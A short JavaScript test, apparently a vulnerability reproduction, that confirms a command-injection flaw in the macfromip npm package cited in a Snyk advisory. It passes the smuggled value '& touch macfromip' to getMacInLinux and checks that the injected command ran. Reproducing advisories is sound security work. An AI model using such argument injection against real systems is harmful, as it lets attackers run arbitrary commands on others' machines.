//https://snyk.io/vuln/SNYK-JS-MACFROMIP-1048336
test("Command Injection in macfromip", () => {
  const a = require("macfromip");
  const fs = require("fs");
  const path = "./macfromip";
  const sleep = require("sleep");
  try {
    fs.unlinkSync(path);
    console.log("File removed:", path);
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  a.getMacInLinux("& touch macfromip", function () {});
  sleep.sleep(5);
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
